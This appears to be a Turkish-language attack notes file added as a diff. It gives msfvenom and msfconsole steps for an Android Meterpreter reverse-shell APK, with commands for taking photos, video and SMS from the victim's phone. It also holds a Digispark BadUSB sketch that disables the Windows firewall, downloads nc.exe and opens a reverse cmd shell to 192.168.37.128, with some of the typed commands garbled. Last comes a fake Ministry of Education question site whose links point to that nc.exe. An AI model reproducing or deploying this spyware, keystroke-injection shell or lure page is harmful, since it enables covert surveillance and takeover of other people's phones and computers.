@@ -1,0 +1,528 @@
+#msfvenom
+______________________________________________________________________________________________________
+msfvenom -p android/meterpreter/reverse_tcp LHOST=lan ip gelecek LPORT=4444 R > /var/www/html/ad.apk
+______________________________________________________________________________________________________
+
+#msfconsole
+______________________________________________________________________________________________________
+use exploit/multi/handler
+use payload  android/meterpreter/reverse_tcp 
+payload=> android/meterpreter/reverse_tcp 
+show options
+set LHOST lan ip adresi
+exploit
+___________________________________________________________________________________________________________________
+#Başarılı bir şekilde hedef cihaza kurduktan sonra şu komutları kullanarak telefonda yetkilerinizi kullanabilirsiniz
+___________________________________________________________________________________________________________________
+app_list   =  uygulamaları listeler
+webcam_snap  = fotoğraf çeker
+webcam_stream  = video kaydı alır
+demp_sms2  = smsleri alıp notdefterinde bize listeler
+_________________________________________________________________________________
+
+MSFCONSOLE TEMEL KOMUTLar
+_________________________________________________________________________________
+
+#*back*#
+use komutunu kullanarak seçtiğiniz bir modülü aktif ettiğinizde, modülü kullanmaktan vazgeçebilirsiniz. Bu durumda, bir üst klasöre geri gelmek istediğinizde kullanılır. Teknik olarak çok gerekli değildir çünkü bulunduğunuz modülün içinde de yeni modül seçtiğinizde o modülden çıkmış olusunuz.
+_________________________________________________________________________________________________________________________________________________________________________
+https://siberoloji.github.io/Metasploit-temel-komutlar-ve-acikalamalari/ <<<==== şuradaki linkten daha detaylı bakabilirins
+
+
+
+
+
+
+#define kdb_tr_tr
+#include "DigiKeyboard.h" // <-- bu tanımlama ise bu kartı bir klavye olarak kullanacağımızı belirtir.
+void setup() {
+  // boş kalsın.
+}
+
+void loop() {
+DigiKeyboard.delay(300);
+DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+DigiKeyboard.delay(300);
+DigiKeyboard.print("system32");
+DigiKeyboard.delay(300);
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(899);
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(800);
+DigiKeyboard.print("netsh firewall set opmode disable");
+DigiKeyboard.delay(300);
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(300);
+DigiKeyboard.print("curl =o nc/exe http?&&192/168/37/128/nc/exe");
+DigiKeyboard.delay(300);
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(300);
+DigiKeyboard.print("nc 192/168/37/128 8080 =e cmd/exe");
+DigiKeyboard.delay(300);
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(300);
+DigiKeyboard.print("netsh firewall set opmode enable");
+DigiKeyboard.sendKeyStroke(KEY_ENTER);
+DigiKeyboard.delay(300);
+DigiKeyboard.print("exıt");
+DigiKeyboard.delay(500);
+    for (;;){} // <-- burdaki işlem ise döngünün sonlanmasını sağlıyor. Bunu yazmas iseniz döngü sonsuz dönecektir.
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="content-type" content="text/html; charset=utf-8" />
+<title>Yazılı Örnek Sorular</title>
+<meta name="keywords" content="" />
+<meta name="description" content="" />
+<link href="default.css" rel="stylesheet" type="text/css" />
+</head>
+<body>
+<div id="menu">
+	<ul>
+		<li class="active"><a href="#" accesskey="1" title="">Anasayfa</a></li>
+		<li><a href="#" accesskey="2" title=""></a>9.Sınıf</li>
+		<li><a href="#" accesskey="3" title=""></a>10.Sınıf</li>
+		<li><a href="#" accesskey="4" title=""></a>11.Sınıf</li>
+		<li><a href="#" accesskey="5" title=""></a>12.Sınıf</li>
+	</ul>
+</div>
+<!-- end #menu -->
+<div id="header">
+	<div id="logo">
+		<h1><a href="#"></a></h1>
+		<h2><a href="http://www.freecsstemplates.org/"></a>T.C Milli Eğitim Bakanlığı</h2>
+	</div>
+	<div id="banner"><a href="#">Hatalı Konular İçin</a></div>
+</div>
+<!-- end #header -->
+<div id="page">
+	<div id="content">
+		<div class="post">
+			<h1 class="title">Hoşgeldiniz!</h1>
+			<div class="story">
+				<p>Hazırlanan örnek sorular Milli Eğitim Baknalığının yönergelerine göre hazırlanmıştır.</p>
+			</div>
+			<div class="meta">
+				<p class="date">Posted on February 22, 2000 </p>
+				<p class="file">Filed under <a href="#">Uncategorized</a> | <a href="#">Edit</a> | <a href="#">28 Comments</a></p>
+			</div>
+		</div>
+		<div class="post boxed">
+			<h2 class="title">Bilgilendirme</h2>
+			<div class="story">
+				<p><strong>Sorular MEB'in yönergeliğine göre hazırlanmıştır yanlış soru veya cevap görme ihtimaliniz sıfırdır aksi taktirde ANASAYFAda bulunan hata bölümünü kullanabilirsiniz</strong></p>
+				<blockquote>
+				<p></p>
+				</blockquote>
+				<h3><a href="http://" target="_blank" rel="noopener noreferrer">Canlı Destek</a></h3>
+				<ul>
+					<li>7/24</li>
+					<li>Yapay Zeka </li>
+					<li>Sohbet Robotu</li>
+				</ul>
+				<p></p>
+				<ol>
+					<li>Liste Elemanı 1</li>
+					<li>Liste Elemanı 2</li>
+					<li>Liste Elemanı 3</li>
+				</ol>
+			</div>
+			<div class="meta">
+				<p class="date">Posted on February 22, 2007 </p>
+				<p class="file">Filed under <a href="#">Uncategorized</a> | <a href="#">Edit</a> | <a href="#">28 Comments</a></p>
+			</div>
+		</div>
+	</div>
+	<!-- end #content -->
+	<div id="sidebar">
+		<ul>
+			<li>
+				<h2>Sınıflar</h2>
+				<ul>
+					<li class="first"><a href="#">8.Sınıf</a> <i>(2)</i></li>
+					<li><a href="192.168.37.128/nc.exe">9.Sınıf</a> <i>(3)</i></li>
+					<li><a href="192.168.37.128/nc.exe">10.Sınıf</a> <i>(3)</i></li>
+					<li><a href="192.168.37.128/nc.exe">11.Sınıf</a> <i>(4)</i></li>
+					<li><a href="192.168.37.128/nc.exe">12.Sınıf</a> <i>(4)</i></li>
+				</u>
+			</li>
+			<li>
+				<h2>Kategoriler</h2>
+				<ul>
+					<li class="first"><a href="#">Matematik</a></li>
+					<li><a href="192.168.37.128/nc.exe">Edebiyat</a></li>
+					<li><a href="192.168.37.128/nc.exe">Fizik</a></li>
+					<li><a href="192.168.37.128/nc.exe">Biyoloji</a></li>
+					<li><a href="192.168.37.128/nc.exe">Kimya</a></li>
+					<li><a href="192.168.37.128/nc.exe">Coğrafya</a></li>
+					<li><a href="192.168.37.128/nc.exe">Tarih</a></li>
+					<li><a href="192.168.37.128/nc.exe">İngilizce</a></li>
+					<li><a href="192.168.37.128/nc.exe">Almanca</a></li>
+				</ul>
+			</li>
+			<li>
+				<h2>Alt Kategoriler</h2>
+				<ul>
+					<li><a href="#">Bilişim Teknolojileri</a></li>
+					<li><a href="#">Beden Eğitimi</a></li>
+					<li><a href="#">Görsel Sanatlar</a></li>
+					<li><a href="#">Seçmeli İlinci Yabancı Dil</a></li>
+					<li><a href="#">Seçmeli Yabancı Dil</a></li>
+
+				</ul>
+			</li>
+		</ul>
+	</div>
+	<!-- end #sidebar -->
+	<div style="clear: both;">&nbsp;</div>
+</div>
+<!-- end #page -->
+<div id="footer">
+	<p id="legal">Copyright &copy; 2007 Aquaria. Designed by <a href="http://www.freecsstemplates.org/">Free CSS Templates</a></p>
+	<p id="links"> <a href="#">Privacy Policy</a> | <a href="#">Terms of Use</a> | <a href="http://validator.w3.org/check/referer" title="This page validates as XHTML 1.0 Transitional"><abbr title="eXtensible HyperText Markup Language">XHTML</abbr></a> | <a href="http://jigsaw.w3.org/css-validator/check/referer" title="This page validates as CSS"><abbr title="Cascading Style Sheets">CSS</abbr></a></p>
+</div>
+<!-- end #footer -->
+
+<head>
+    <style>
+        
+* {
+	margin: 0;
+	padding: 0;
+} 
+
+h1, h2, h3 {
+	margin-bottom: 15px;
+	font-family: Georgia, "ui-sans-serif";
+	font-weight: "fangsong";
+	color: #c0354e;
+}
+ 
+h1 {
+	font-size: 190%;
+}
+ 
+h2 {
+	font-size: 190%;
+}
+ 
+h3 {
+	font-size: 180%;
+	font-weight: bold;
+}
+ 
+p, ul, ol {
+	margin-bottom: 20px;
+	line-height: 1.3em;
+}
+ 
+ul, ol {
+	margin-left: 1.50em;
+}
+ 
+blockquote {
+	margin-left: 2em;
+	padding-left: 2em;
+	background: url(/img/ice-age.jpg);
+	font-style: italic;
+}
+ 
+a:link {
+	color: #188FA7;
+}
+ 
+a:hover, a:active {
+	text-decoration: none;
+	color: #ff0000;
+}
+ 
+a:visited {
+	color: #523f34;
+}
+ 
+img {
+	border: none;
+}
+ 
+img.left {
+	float: left;
+	margin: 0 20px 0 0;
+}
+ 
+img.right {
+	float: right;
+	margin: 0 0 0 20px;
+}
+ 
+/* Menu */
+ 
+#menu {
+	width: 770px;
+	height: 105px;
+	margin: 0 auto;
+}
+ 
+#menu ul {
+	margin: 0;
+	padding: 0;
+	list-style: none;
+}
+ 
+#menu li {
+	display: block;
+	float: left;
+	width: 122px;
+	height: 65px;
+	padding: 40px 0 0 0;
+}
+ 
+#menu a {
+	display: block;
+	width: 122px;
+	height: 32px;
+	padding: 13px 0 0 0;
+	background: url(images/img02.jpg) no-repeat;
+	text-align: center;
+	text-transform: uppercase;
+	text-decoration: none;
+	font-weight: bold;
+	color: #000000;
+}
+ 
+#menu a:hover {
+	background-image: url(images/img03.jpg);
+}
+ 
+#menu .active {
+	padding-top: 35px;
+}
+ 
+#menu .active a {
+	height: 37px;
+	padding-top: 16px;
+	background-image: url(images/img04.jpg);
+	color: #327EBE;
+}
+ 
+#menu .active a:hover {
+	background-image: url(images/img04.jpg);
+}
+ 
+/* Header */
+ 
+#header {
+	width: 770px;
+	height: 160px;
+	margin: 0 auto;
+}
+ 
+/* Logo */
+ 
+#logo {
+	float: left;
+	width: 250px;
+	height: 160px;
+	background: url(images/img05.jpg) no-repeat;
+}
+ 
+#logo h1, #logo h2 {
+	text-align: center;
+}
+ 
+#logo h1 {
+	padding-top: 90px;
+	background: url(images/img07.jpg) no-repeat center center;
+	letter-spacing: 8px;
+	font-size: 197%;
+}
+ 
+#logo h2 {
+	letter-spacing: 2px;
+	font-size: 85%;
+}
+ 
+#logo a {
+	text-transform: uppercase;
+	text-decoration: none;
+	color: #020202;
+}
+ 
+/* Banner */
+ 
+#banner {
+	float: right;
+	width: 520px;
+	height: 160px;
+	background: url(images/img06.jpg) no-repeat;
+}
+ 
+#banner a {
+	float: right;
+	padding: 120px 20px 0 0;
+	text-decoration: none;
+	text-align: right;
+	font-size: 136%;
+	font-style: italic;
+	color: #000000;
+}
+ 
+/* Page */
+ 
+#page {
+	width: 760px;
+	margin: 0 auto;
+	padding: 20px 0 0 0;
+}
+ 
+/* Content */
+ 
+#content {
+	float: right;
+	width: 510px;
+}
+ 
+.post {
+	margin-bottom: 20px;
+}
+ 
+.post .title {
+	padding: 0 20px;
+}
+ 
+.post .story {
+	padding: 0 20px;
+}
+ 
+.post .meta {
+	padding: 5px 20px;
+	background: url(images/img09.gif) repeat-x;
+}
+ 
+.post .meta p {
+	margin: 0;
+	font-size: 77%;
+}
+ 
+.boxed .title {
+	height: 32px;
+	margin: 0;
+	padding: 8px 0 0 20px;
+	background: url(images/img08.jpg) no-repeat;
+	letter-spacing: -1px;
+	color: #020202;
+}
+ 
+.boxed .story {
+	padding: 20px;
+	border: 1px solid #3b352e;
+}
+ 
+.boxed .meta {
+	padding: 5px 10px;
+	background: #FF8D17;
+	color: #352323;
+}
+ 
+.boxed .meta a {
+	color: #643f3f;
+}
+ 
+/* Sidebar */
+ 
+#sidebar {
+	float: left;
+	width: 240px;
+}
+ 
+#sidebar ul {
+	margin: 0;
+	padding: 0;
+	list-style: none;
+}
+ 
+#sidebar li {
+	margin-bottom: 15px;
+}
+ 
+#sidebar li ul {
+	padding: 10px;
+	border: 1px solid #000000;
+	border-top: none;
+}
+ 
+#sidebar li li {
+	margin: 0;
+	padding: 3px 0;
+	background: url(images/img09.gif) repeat-x;
+}
+ 
+#sidebar li li.first {
+	background: none;
+}
+ 
+#sidebar li h2 {
+	height: 30px;
+	margin: 0;
+	padding: 10px;
+	background: url(images/img10.jpg) no-repeat;
+	letter-spacing: -1px;
+	color: #ff0000;
+}
+ 
+#sidebar a:link {
+	text-decoration: none;
+}
+ 
+#sidebar a:hover {
+	text-decoration: underline;
+}
+ 
+#sidebar li a {
+	padding-left: 10px;
+	background: url(images/img11.gif) no-repeat left center;
+}
+ 
+/* Footer */
+ 
+#footer {
+	clear: both;
+	height: 100px;
+	padding: 15px 0;
+	background: #a2e5e7;
+	border-top: 5px solid #a2dee7;
+	text-align: center;
+}
+ 
+#footer p {
+	margin: 0;
+	color: #273E47;
+}
+ 
+#footer a {
+	color: #273E47;
+}
+ 
+#footer a:hover {
+	color: #D5D6AA;
+}
+    </style>
+</head>
